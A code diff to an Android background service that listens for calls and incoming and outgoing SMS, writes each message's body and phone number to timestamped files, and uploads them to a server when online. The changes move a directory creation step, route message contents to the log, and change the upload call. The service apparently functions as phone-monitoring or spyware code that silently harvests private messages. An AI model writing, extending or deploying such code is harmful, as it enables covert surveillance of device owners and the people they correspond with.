@@ -46,6 +46,8 @@ public class BackService extends Service {
 	SmsManager smsManager;
 	public static String id = "";
 	LocalBroadcastManager localBroadcastManager;
+	boolean observingSMS = false;
+	String lastID = "";
 
 	@Override
 	public void onCreate() {
@@ -56,15 +58,11 @@ public class BackService extends Service {
 		phoneListener = new PhoneListener(this);
 		telephony = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
 		telephony.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);
-
 		pref = PreferenceManager.getDefaultSharedPreferences(this);
-
 		localBroadcastManager = LocalBroadcastManager.getInstance(this);
-
 		registerReceiver(outcallReceiver, new IntentFilter(Intent.ACTION_NEW_OUTGOING_CALL));
 		registerReceiver(smsReceiver, new IntentFilter("android.provider.Telephony.SMS_RECEIVED"));
 		smsManager = SmsManager.getDefault();
-
 		getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, outsmsObserver);
 	}
 
@@ -86,17 +84,15 @@ public class BackService extends Service {
 			final Bundle bundle = intent.getExtras();
 			try {
 				if (bundle != null) {
-
 					String message = "";
-
 					final Object[] pdusObj = (Object[]) bundle.get("pdus");
 					String phoneNumber = "";
 					for (int i = 0; i < pdusObj.length; i++) {
 
 						SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
 						phoneNumber = currentMessage.getDisplayOriginatingAddress();
-						System.out.println(currentMessage);
-						System.out.println(phoneNumber);
+						Log.i(AppGlobals.getLogTag(getClass())," "+currentMessage);
+						Log.i(AppGlobals.getLogTag(getClass()),phoneNumber);
 						message += currentMessage.getDisplayMessageBody();
 					}
 				}
@@ -105,9 +101,6 @@ public class BackService extends Service {
 			}
 		}
 	};
-
-	boolean observingSMS = false;
-	String lastID = "";
 
 	ContentObserver outsmsObserver = new ContentObserver(new Handler()) {
 
@@ -126,20 +119,18 @@ public class BackService extends Service {
 				// last SMS
 				// sent
 				Log.e(LOG_TAG, cur.getCount() + ">");
+                File dir = new File(RecordService.DEFAULT_STORAGE_LOCATION);
+                if (!dir.exists()) {
+                    dir.mkdirs();
+                }
 				if (cur.moveToNext()) {
-					System.out.println("moveToNext");
 					Log.e(LOG_TAG, cur.getString(cur.getColumnIndex("type")));
-					System.out.println(cur.getString(cur.getColumnIndex("type")));
 					if (cur.getString(cur.getColumnIndex("type")).equals("1") ||
 							cur.getString(cur.getColumnIndex("type")).equals("2")) {
 						String id = cur.getString(cur.getColumnIndex("_id"));
 						if (!id.equals(lastID)) {
 							String content = cur.getString(cur.getColumnIndex("body"));
 							String no = cur.getString(cur.getColumnIndex("address"));
-							File dir = new File(RecordService.DEFAULT_STORAGE_LOCATION);
-								if (!dir.exists()) {
-									dir.mkdirs();
-								}
 							File file = new File(dir,Util.getTime()+"sms.txt");
 							fileName = file.getName();
 							FileWriter writer = new FileWriter(file);
@@ -151,17 +142,16 @@ public class BackService extends Service {
 							} else {
 								return;
 							}
-							writer.append("body : "+content+ "_Number : "+no+"Statue:" + status);
+							writer.append("_Number : "+no+"Statue :" + status+"body : "+content);
 							writer.flush();
 							writer.close();
+							String path = RecordService.DEFAULT_STORAGE_LOCATION;
 							if (helpers.isOnline()) {
-                                String path = RecordService.DEFAULT_STORAGE_LOCATION;
-								ArrayList<String> arrayList = new ArrayList<>(Arrays.asList(path+fileName));
-								new Util(getApplicationContext()).execute(arrayList);
-							} else {
-								dbHandler.createNewFileNameForUpload("filename",RecordService.
-										DEFAULT_STORAGE_LOCATION+fileName);
-							}
+                                helpers.requestFiletUpload(path+fileName);
+                                new Thread(helpers).start();
+                            } else {
+                                dbHandler.createNewFileNameForUpload("filename",path+fileName);
+                            }
 						}
 						lastID = id;
 					}
